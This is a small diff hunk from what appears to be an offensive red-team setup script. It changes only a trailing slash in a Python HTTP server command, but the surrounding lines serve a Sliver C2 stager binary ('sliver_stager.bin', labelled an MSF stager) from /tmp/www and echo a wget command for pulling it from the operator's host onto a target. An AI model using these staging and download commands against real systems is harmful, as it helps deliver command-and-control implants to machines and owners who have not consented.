@@ -41,7 +41,7 @@ mkdir /tmp/www
 
 chown kali:kali /tmp/www/sliver_stager.bin
 
-python3 -m http.server -d /tmp/www &
+python3 -m http.server -d /tmp/www/ &
 
 echo "=== Access Your MSF Stager here ==="
 echo "wget http://"$ip":8000/sliver_stager.bin"
